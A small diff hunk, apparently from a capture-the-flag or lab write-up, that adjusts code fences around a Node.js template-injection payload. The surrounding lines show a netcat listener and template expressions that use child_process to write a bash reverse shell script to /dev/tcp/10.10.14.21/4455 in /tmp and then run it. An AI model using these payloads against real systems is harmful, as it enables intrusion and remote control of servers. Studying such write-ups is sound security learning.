@@ -42,7 +42,8 @@ $ nc -lvnp 4455
 ```
 {{ process.mainModule.require('child_process').exec('echo "#!/bin/bash\nbash -i
 >& /dev/tcp/10.10.14.21/4455 0>&1" > /tmp/exploit.sh') }}
-
+```
+```
 {{ process.mainModule.require('child_process').exec('/bin/bash /tmp/exploit.sh')
 }}
 ```
